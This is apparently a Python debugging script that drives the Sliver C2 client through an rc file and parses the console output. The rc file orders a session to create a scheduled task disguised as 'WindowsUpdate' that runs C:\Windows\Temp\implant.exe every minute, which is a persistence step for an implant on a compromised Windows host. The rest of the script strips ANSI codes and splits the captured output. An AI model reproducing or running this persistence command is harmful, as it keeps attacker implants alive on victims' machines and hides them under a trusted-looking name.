"""调试 schtasks 输出"""
import subprocess, os, tempfile, re

rc_file = os.path.join(tempfile.gettempdir(), 'sliver_debug_schtask.txt')
with open(rc_file, 'w', encoding='ascii') as f:
    f.write('use 9cb8b9d1\nexecute -o schtasks /create /sc minute /mo 1 /tn "WindowsUpdate" /tr "C:\\Windows\\Temp\\implant.exe" /f\nexit')

result = subprocess.run('.\\sliver-client.exe console --rc "' + rc_file + '"', shell=True, capture_output=True, timeout=180, cwd='d:\\sliver')
raw = result.stdout

print(f"Total bytes: {len(raw)}")
print("=== RAW ===")
print(raw)
print("=== REPR ===")
print(repr(raw))
print()

# 模拟清理
text = raw.decode('utf-8', errors='replace')
print("=== DECODED ===")
print(repr(text))

# 清理 ANSI
cleaned = re.sub(r'\x1b\[[0-9;]*[a-zA-Z]', '', text)
print("=== AFTER ANSI ===")
print(repr(cleaned))

# 按 \r 分割
segments = cleaned.split('\r')
print(f"=== {len(segments)} SEGMENTS ===")
for i, seg in enumerate(segments):
    print(f"  [{i}] {repr(seg[:100])}")

# 取最后一段
output = segments[-1]
print("=== LAST SEGMENT ===")
print(repr(output))

# 移除空行
lines = output.split('\n')
cleaned_lines = [line for line in lines if line.strip()]
output = '\n'.join(cleaned_lines)
print("=== FINAL ===")
print(repr(output))
